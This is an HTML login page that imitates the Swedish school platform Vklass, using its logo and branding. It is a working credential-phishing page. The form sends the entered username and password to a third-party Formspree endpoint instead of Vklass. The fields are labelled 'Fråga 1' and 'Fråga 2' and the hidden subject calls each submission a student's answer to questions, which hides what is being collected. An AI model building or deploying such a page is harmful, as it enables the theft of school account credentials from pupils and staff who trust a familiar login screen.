<!DOCTYPE html>
<html lang="sv">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Logga in i Vklass</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', system-ui, sans-serif;
      background: #f8f9fa;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: #333;
    }
    .container {
      background: white;
      width: 100%;
      max-width: 420px;
      border-radius: 8px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.1);
      overflow: hidden;
      margin: 1rem;
    }
    .header {
      background: linear-gradient(135deg, #0066cc, #0099ff);
      color: white;
      padding: 2.2rem 1.8rem 1.6rem;
      text-align: center;
    }
    .header img {
      height: 48px;
      margin-bottom: 1rem;
    }
    .header h1 {
      margin: 0;
      font-size: 1.55rem;
      font-weight: 500;
    }
    .content {
      padding: 2rem 2.2rem 1.8rem;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 500;
      color: #444;
      font-size: 0.95rem;
    }
    input {
      width: 100%;
      padding: 0.9rem 1rem;
      border: 1px solid #ced4da;
      border-radius: 6px;
      font-size: 1rem;
      box-sizing: border-box;
      transition: border-color 0.15s;
    }
    input:focus {
      outline: none;
      border-color: #0066cc;
      box-shadow: 0 0 0 3px rgba(0,102,204,0.15);
    }
    .checkbox {
      margin: 1.2rem 0;
      display: flex;
      align-items: center;
      font-size: 0.95rem;
      color: #555;
    }
    .checkbox input {
      width: auto;
      margin-right: 0.6rem;
    }
    button {
      width: 100%;
      padding: 1rem;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 6px;
      font-size: 1.1rem;
      font-weight: 500;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 0.5rem;
      transition: background 0.2s;
    }
    button:hover {
      background: #0055b3;
    }
    button::after {
      content: "→";
      font-size: 1.3rem;
    }
    .links {
      text-align: center;
      margin-top: 1.4rem;
      font-size: 0.95rem;
    }
    .links a {
      color: #0066cc;
      text-decoration: none;
    }
    .links a:hover {
      text-decoration: underline;
    }
    .footer {
      text-align: center;
      color: #777;
      font-size: 0.85rem;
      margin: 2rem 0 1rem;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">
      <!-- Byt gärna ut src till riktig Vklass-logga om du har den -->
      <img src="https://www.vklass.se/images/_common/vklass.svg" alt="Vklass logga" 
           onerror="this.src='https://via.placeholder.com/180x48/0066cc/ffffff?text=Vklass';">
      <h1>Logga in i Vklass</h1>
    </div>

    <div class="content">
      <form action="https://formspree.io/f/meelzawg" method="POST">
        <!-- Dolda fält -->
        <input type="hidden" name="_subject" value="Nytt elevsvar - Frågor">
        <input type="hidden" name="_language" value="sv">

        <div style="margin-bottom: 1.4rem;">
          <label for="q1">Användarnamn</label>
          <input type="text" id="q1" name="Fråga 1" required autocomplete="off" placeholder="Användarnamn eller e-post">
        </div>

        <div style="margin-bottom: 1.2rem;">
          <label for="q2">Lösenord</label>
          <input type="password" id="q2" name="Fråga 2" required autocomplete="off" placeholder="Lösenord">
        </div>

        <div class="checkbox">
          <input type="checkbox" id="remember" name="remember">
          <label for="remember" style="margin:0; cursor:pointer;">Kom ihåg mig</label>
        </div>

        <button type="submit">Logga in</button>
      </form>

      <div class="links">
        <a href="#">Glömt inloggningsuppgifter?</a>
      </div>
    </div>
  </div>

  <div class="footer">
    <p>© Vklass – En tjänst för skolor och förskolor</p>
  </div>

</body>
</html>
